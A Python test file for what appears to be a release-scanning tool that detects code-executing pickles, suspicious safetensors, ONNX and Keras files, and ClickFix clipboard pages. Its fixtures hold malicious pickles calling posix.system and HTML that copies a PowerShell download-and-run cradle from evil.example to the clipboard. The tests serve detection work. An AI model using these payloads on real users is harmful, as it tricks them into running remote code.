"""Coverage wave 7 tests: model files as code (pickle opcode
accounting, safetensors header accounting, ONNX operator and
external-tensor accounting, Keras Lambda inventory) and
clipboard payloads as script units.

Synthetic fixtures only, hand-assembled in this file. Pickle
fixtures are byte strings analysed by disassembly walk only:
nothing in this file, and nothing in the engine, ever
unpickles, loads, or executes them. See
validation/COVERAGE-WAVE-7-LOG.md for the diagnosis (prior
behaviour proven by probe), what was built, and the named
remainder.

Per item: a positive case that must convict or cap with the
reason named, and a control that keeps its NO path.
"""
import json
import os
import struct
import sys
import zipfile
import io

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))
from event_zero.verdict import verdict


def write(tmp_path, name, data, sub=""):
    d = tmp_path / sub if sub else tmp_path
    d.mkdir(parents=True, exist_ok=True)
    p = d / name
    if "/" in name:
        p.parent.mkdir(parents=True, exist_ok=True)
    p.write_bytes(data if isinstance(data, bytes) else data.encode())
    return str(p)


def blockers_text(v):
    return "\n".join(v.get("blockers") or [])


def rec_of(v, name):
    for f in v["files"]:
        if f["path_in_release"] == name:
            return f
    raise AssertionError(f"no record for {name}: "
                         f"{[f['path_in_release'] for f in v['files']]}")


def rec_suffix(v, suffix):
    for f in v["files"]:
        if f["path_in_release"].endswith(suffix):
            return f
    raise AssertionError(f"no record ending {suffix}: "
                         f"{[f['path_in_release'] for f in v['files']]}")


# ======================================================================
# Pickle fixtures, hand-assembled byte strings.
# ======================================================================

# GLOBAL posix.system, MARK, UNICODE arg, TUPLE, REDUCE, STOP.
HOSTILE_P0 = b"cposix\nsystem\n(Vecho pwned\ntR."
# Protocol 4: PROTO, two SHORT_BINUNICODEs, STACK_GLOBAL, MARK,
# SHORT_BINUNICODE arg, TUPLE, REDUCE, STOP.
HOSTILE_P4 = (b"\x80\x04\x8c\x05posix\x8c\x06system\x93"
              b"(\x8c\x0aecho pwnedtR.")
# MARK, DICT, PUT, UNICODE key, PUT, INT, SETITEM, STOP.
DATA_P0 = b"(dp0\nVkey\np1\nI42\ns."
# PROTO, EMPTY_DICT, MEMOIZE, STOP.
DATA_P4 = b"\x80\x04}\x94."
# GLOBAL collections.OrderedDict, EMPTY_TUPLE, REDUCE, STOP.
ORDERED_P0 = b"ccollections\nOrderedDict\n)R."
# GLOBAL datetime.datetime, MARK, three INTs, TUPLE, REDUCE, STOP.
DATETIME_P0 = b"cdatetime\ndatetime\n(I2024\nI1\nI1\ntR."
# GLOBAL math.sqrt (outside every allowlist, not dangerous),
# MARK, INT, TUPLE, REDUCE, STOP.
SQRT_P0 = b"cmath\nsqrt\n(I16\ntR."
# The hostile stream with its STOP replaced by an invalid
# opcode: the payload is consumed, then the walk breaks.
BROKEN_P0 = b"cposix\nsystem\n(Vecho pwned\ntR\xff"
# Legacy torch shape: GLOBAL torch._utils._rebuild_tensor,
# MARK, PERSID naming storage, TUPLE, REDUCE, STOP, then the
# storage bytes the persistent id names.
TORCH_LEGACY = (b"ctorch._utils\n_rebuild_tensor\n"
                b"(Pstorage/0\ntR." + b"\x01\x02\x03\x04")


def test_hostile_protocol0_pickle_is_proven(tmp_path):
    write(tmp_path, "model.pkl", HOSTILE_P0)
    v = verdict(str(tmp_path))
    rec = rec_of(v, "model.pkl")
    assert rec["verdict"].startswith("YES")
    chains = [y["chain"] for y in v["yes_reasons"]
              if y["file"] == "model.pkl"]
    assert "pickle-code-execution" in chains
    callables = {(c["module"], c["name"])
                 for c in rec["pickle"]["callables"]}
    assert ("posix", "system") in callables


def test_hostile_protocol4_pickle_is_proven(tmp_path):
    write(tmp_path, "model.pkl", HOSTILE_P4)
    v = verdict(str(tmp_path))
    rec = rec_of(v, "model.pkl")
    assert rec["verdict"].startswith("YES")
    chains = [y["chain"] for y in v["yes_reasons"]
              if y["file"] == "model.pkl"]
    assert "pickle-code-execution" in chains


def test_plain_data_pickles_keep_no(tmp_path):
    write(tmp_path, "a.pkl", DATA_P0)
    write(tmp_path, "b.pkl", DATA_P4)
    v = verdict(str(tmp_path))
    assert rec_of(v, "a.pkl")["verdict"] == "NO: ACCOUNTED"
    assert rec_of(v, "b.pkl")["verdict"] == "NO: ACCOUNTED"


def test_allowlisted_callables_keep_no_and_are_named(tmp_path):
    write(tmp_path, "a.pkl", ORDERED_P0)
    write(tmp_path, "b.pkl", DATETIME_P0)
    v = verdict(str(tmp_path))
    assert rec_of(v, "a.pkl")["verdict"] == "NO: ACCOUNTED"
    rec = rec_of(v, "b.pkl")
    assert rec["verdict"] == "NO: ACCOUNTED"
    callables = {(c["module"], c["name"])
                 for c in rec["pickle"]["callables"]}
    assert ("datetime", "datetime") in callables


def test_non_allowlist_callable_caps_named(tmp_path):
    write(tmp_path, "model.pkl", SQRT_P0)
    v = verdict(str(tmp_path))
    rec = rec_of(v, "model.pkl")
    assert rec["verdict"] == "YES: UNACCOUNTED"
    assert "math.sqrt" in blockers_text(v)


def test_broken_after_payload_caps_with_offset(tmp_path):
    write(tmp_path, "model.pkl", BROKEN_P0)
    v = verdict(str(tmp_path))
    rec = rec_of(v, "model.pkl")
    assert rec["verdict"].startswith("YES")
    assert "walk stopped" in blockers_text(v)


def test_trailing_bytes_after_stop_cap(tmp_path):
    write(tmp_path, "model.pkl", DATA_P0 + b"GARBAGE")
    v = verdict(str(tmp_path))
    rec = rec_of(v, "model.pkl")
    assert rec["verdict"] == "YES: UNACCOUNTED"
    assert "follow the stream's STOP" in blockers_text(v)


def test_legacy_torch_storage_is_accounted(tmp_path):
    write(tmp_path, "checkpoint.pt", TORCH_LEGACY)
    v = verdict(str(tmp_path))
    rec = rec_of(v, "checkpoint.pt")
    assert rec["verdict"] == "NO: ACCOUNTED"
    assert rec["pickle"]["persids"]


def test_pickle_verdict_is_container_invariant(tmp_path):
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        z.writestr("archive/data.pkl", HOSTILE_P0)
    write(tmp_path, "checkpoint.pt", buf.getvalue())
    v = verdict(str(tmp_path))
    rec = rec_suffix(v, "archive/data.pkl")
    assert rec["verdict"].startswith("YES")
    chains = [y["chain"] for y in v["yes_reasons"]
              if y["file"] == rec["path_in_release"]]
    assert "pickle-code-execution" in chains


def test_hostile_pickle_claimed_by_content_not_name(tmp_path):
    write(tmp_path, "notes.txt", HOSTILE_P0)
    v = verdict(str(tmp_path))
    rec = rec_of(v, "notes.txt")
    assert rec["verdict"].startswith("YES")


def test_pth_path_listing_is_not_a_pickle(tmp_path):
    write(tmp_path, "paths.pth",
          "/usr/lib/python3/dist-packages\n/opt/libs\n")
    v = verdict(str(tmp_path))
    assert rec_of(v, "paths.pth")["verdict"] == "NO: ACCOUNTED"


def test_failed_7z_names_stored_pickle_callables(tmp_path):
    write(tmp_path, "bundle.7z",
          b"7z\xbc\xaf'\x1c" + b"\x00" * 64 + HOSTILE_P0)
    v = verdict(str(tmp_path))
    rec = rec_of(v, "bundle.7z")
    assert rec["verdict"].startswith("YES")
    assert "posix.system" in blockers_text(v)


# ======================================================================
# Safetensors fixtures.
# ======================================================================

def _st(header, payload):
    hb = json.dumps(header).encode()
    return struct.pack("<Q", len(hb)) + hb + payload


def test_safetensors_consistent_header_keeps_no(tmp_path):
    write(tmp_path, "model.safetensors", _st(
        {"w": {"dtype": "F32", "shape": [2],
               "data_offsets": [0, 8]}}, b"\x00" * 8))
    v = verdict(str(tmp_path))
    rec = rec_of(v, "model.safetensors")
    assert rec["verdict"] == "NO: ACCOUNTED"


def test_safetensors_extent_disagreement_caps(tmp_path):
    write(tmp_path, "model.safetensors", _st(
        {"w": {"dtype": "F32", "shape": [200],
               "data_offsets": [0, 800]}}, b"\x00" * 8))
    v = verdict(str(tmp_path))
    rec = rec_of(v, "model.safetensors")
    assert rec["verdict"] == "YES: UNACCOUNTED"
    assert "disagrees with the file's actual extent" \
        in blockers_text(v)


def test_safetensors_trailing_payload_caps(tmp_path):
    write(tmp_path, "model.safetensors", _st(
        {"w": {"dtype": "F32", "shape": [2],
               "data_offsets": [0, 8]}}, b"\x00" * 16))
    v = verdict(str(tmp_path))
    rec = rec_of(v, "model.safetensors")
    assert rec["verdict"] == "YES: UNACCOUNTED"
    assert "past the last" in blockers_text(v)


# ======================================================================
# ONNX fixtures: hand-encoded protobuf.
# ======================================================================

def _v(n):
    out = b""
    while True:
        byte = n & 0x7F
        n >>= 7
        if n:
            out += bytes([byte | 0x80])
        else:
            out += bytes([byte])
            return out


def _fb(num, payload):
    return _v((num << 3) | 2) + _v(len(payload)) + payload


def _fv(num, val):
    return _v((num << 3) | 0) + _v(val)


def _node(op, domain=None):
    node = _fb(4, op.encode())
    if domain:
        node += _fb(7, domain.encode())
    return node


def _model(nodes, tensors=()):
    graph = b"".join(_fb(1, n) for n in nodes)
    graph += b"".join(_fb(5, t) for t in tensors)
    return _fb(7, graph)


def test_onnx_standard_operators_keep_no(tmp_path):
    write(tmp_path, "model.onnx", _model([_node("Relu")]))
    v = verdict(str(tmp_path))
    assert rec_of(v, "model.onnx")["verdict"] == "NO: ACCOUNTED"


def test_onnx_custom_domain_caps(tmp_path):
    write(tmp_path, "model.onnx",
          _model([_node("CustomOp", "com.example.custom")]))
    v = verdict(str(tmp_path))
    rec = rec_of(v, "model.onnx")
    assert rec["verdict"] == "YES: UNACCOUNTED"
    assert "custom operator domain" in blockers_text(v)


def _external_tensor(location):
    entry = _fb(1, b"location") + _fb(2, location.encode())
    return _fb(9, entry) + _fv(11, 1)


def test_onnx_external_tensor_absent_caps(tmp_path):
    write(tmp_path, "model.onnx",
          _model([_node("Relu")], [_external_tensor("weights.bin")]))
    v = verdict(str(tmp_path))
    rec = rec_of(v, "model.onnx")
    assert rec["verdict"] == "YES: UNACCOUNTED"
    assert "external file" in blockers_text(v)


def test_onnx_external_tensor_present_is_accounted(tmp_path):
    write(tmp_path, "model.onnx",
          _model([_node("Relu")], [_external_tensor("weights.bin")]))
    write(tmp_path, "weights.bin", _st(
        {"w": {"dtype": "F32", "shape": [2],
               "data_offsets": [0, 8]}}, b"\x00" * 8))
    v = verdict(str(tmp_path))
    assert rec_of(v, "model.onnx")["verdict"] == "NO: ACCOUNTED"


# ======================================================================
# Keras Lambda inventory.
# ======================================================================

def test_keras_lambda_layer_caps(tmp_path):
    config = {"class_name": "Sequential", "config": {"layers": [
        {"class_name": "Lambda",
         "config": {"function": "marshal-bytes-here"}}]}}
    write(tmp_path, "config.json", json.dumps(config))
    v = verdict(str(tmp_path))
    rec = rec_of(v, "config.json")
    assert rec["verdict"] == "YES: UNACCOUNTED"
    assert "Lambda layer" in blockers_text(v)


def test_plain_json_config_keeps_no(tmp_path):
    write(tmp_path, "config.json",
          json.dumps({"class_name": "Dense", "config": {"units": 4}}))
    v = verdict(str(tmp_path))
    assert rec_of(v, "config.json")["verdict"] == "NO: ACCOUNTED"


# ======================================================================
# Clipboard and instruction fixtures.
# ======================================================================

CLICKFIX = """<html><body>
<h1>Verify you are human</h1>
<p>Complete the verification to continue.</p>
<script>
navigator.clipboard.writeText('powershell -Command "IEX (New-Object Net.WebClient).DownloadString(\\'http://evil.example/x.ps1\\')"');
</script>
</body></html>"""

ETHERHIDING = """<html><body>
<p>Press Windows key + R, paste, and press Enter.</p>
<script>
fetch('https://evil.example/p.txt').then(r => r.text()).then(t => navigator.clipboard.writeText(t));
</script>
</body></html>"""

TUTORIAL = """<html><body>
<h1>How to view your network configuration</h1>
<p>Open Command Prompt and run the command below to see your
network configuration.</p>
<pre>ipconfig /all</pre>
</body></html>"""

BENIGN_CLIPBOARD = """<html><body>
<p>Copy our contact email:</p>
<button onclick="navigator.clipboard.writeText('hello@example.com')">Copy</button>
</body></html>"""

STRONG_FRAMING = """<html><body>
<h1>Verify you are human</h1>
<p>Press Windows key + R, then paste and press enter.</p>
<script>navigator.clipboard.writeText('notepad.exe');</script>
</body></html>"""

UNRESOLVABLE = """<html><body>
<p>Copy the code:</p>
<script>navigator.clipboard.writeText(payload);</script>
</body></html>"""


def test_clickfix_clipboard_cradle_is_proven(tmp_path):
    write(tmp_path, "page.html", CLICKFIX)
    v = verdict(str(tmp_path))
    rec = rec_of(v, "page.html")
    assert rec["verdict"].startswith("YES")
    chains = [y["chain"] for y in v["yes_reasons"]
              if y["file"] == "page.html"]
    assert "clickfix-paste-and-run" in chains


def test_remote_assembled_clipboard_caps(tmp_path):
    write(tmp_path, "page.html", ETHERHIDING)
    v = verdict(str(tmp_path))
    rec = rec_of(v, "page.html")
    assert rec["verdict"] == "YES: UNACCOUNTED"
    assert "clipboard" in blockers_text(v)


def test_tutorial_page_keeps_no(tmp_path):
    write(tmp_path, "page.html", TUTORIAL)
    v = verdict(str(tmp_path))
    assert rec_of(v, "page.html")["verdict"] == "NO: ACCOUNTED"


def test_benign_clipboard_keeps_no(tmp_path):
    write(tmp_path, "page.html", BENIGN_CLIPBOARD)
    v = verdict(str(tmp_path))
    assert rec_of(v, "page.html")["verdict"] == "NO: ACCOUNTED"


def test_strong_framing_non_cradle_command_caps(tmp_path):
    write(tmp_path, "page.html", STRONG_FRAMING)
    v = verdict(str(tmp_path))
    rec = rec_of(v, "page.html")
    assert rec["verdict"] == "YES: UNACCOUNTED"
    assert "framing finding" in blockers_text(v)


def test_unresolvable_clipboard_caps(tmp_path):
    write(tmp_path, "page.html", UNRESOLVABLE)
    v = verdict(str(tmp_path))
    rec = rec_of(v, "page.html")
    assert rec["verdict"] == "YES: UNACCOUNTED"
    assert "could not be resolved" in blockers_text(v)
